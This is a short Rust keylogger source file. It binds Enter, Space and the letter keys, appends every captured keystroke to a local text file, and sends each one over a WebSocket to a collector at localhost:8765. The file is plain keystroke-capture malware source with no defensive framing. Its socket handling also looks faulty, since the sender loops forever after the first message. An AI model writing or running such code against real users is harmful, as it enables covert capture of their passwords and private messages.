use inputbot::{KeybdKey::*, MouseButton::*, *};
use std::fs::OpenOptions;
use std::io::prelude::*;
use tungstenite::{connect, Message};
use url::Url;


const ws_address:&str = "ws://localhost:8765";

fn passthrough_key(event: &str) {
    file_writer(event);
    ws_client(event);
}

fn file_writer(event: &str) {
    let mut file = OpenOptions::new()
    .write(true)
    .append(true)
    .open("text.txt")
    .unwrap();

    if let Err(e) = write!(file, "{}", event) {
        eprintln!("Couldn't write to file: {}", e);
    }
}

fn ws_client(event: &str) {
    // env_logger::init();
    let (mut socket, response) =
    connect(Url::parse(&ws_address).unwrap()).expect("Can't connect");

    socket.write_message(Message::Text(event.into())).unwrap();
    loop {
        let msg = socket.read_message().expect("Error readingasbhello message");
        println!("Received: {}", msg);
    }
}

fn main() {
    println!("Keylogger Running");
    keyboard_input();
}

fn keyboard_input() {
    EnterKey.bind(|| { passthrough_key("\n") });
    SpaceKey.bind(|| { passthrough_key(" ") });
    AKey.bind(|| { passthrough_key("a") });
    BKey.bind(|| { passthrough_key("b") });
    CKey.bind(|| { passthrough_key("c") });
    DKey.bind(|| { passthrough_key("d") });
    EKey.bind(|| { passthrough_key("e") });
    FKey.bind(|| { passthrough_key("f") });
    GKey.bind(|| { passthrough_key("g") });
    HKey.bind(|| { passthrough_key("h") });
    IKey.bind(|| { passthrough_key("i") });
    JKey.bind(|| { passthrough_key("j") });
    KKey.bind(|| { passthrough_key("k") });
    LKey.bind(|| { passthrough_key("l") });
    MKey.bind(|| { passthrough_key("m") });
    NKey.bind(|| { passthrough_key("n") });
    OKey.bind(|| { passthrough_key("o") });
    PKey.bind(|| { passthrough_key("p") });
    QKey.bind(|| { passthrough_key("q") });
    RKey.bind(|| { passthrough_key("r") });
    SKey.bind(|| { passthrough_key("s") });
    TKey.bind(|| { passthrough_key("t") });
    UKey.bind(|| { passthrough_key("u") });
    VKey.bind(|| { passthrough_key("v") });
    WKey.bind(|| { passthrough_key("w") });
    XKey.bind(|| { passthrough_key("x") });
    YKey.bind(|| { passthrough_key("y") });
    ZKey.bind(|| { passthrough_key("z") });

    handle_input_events();
}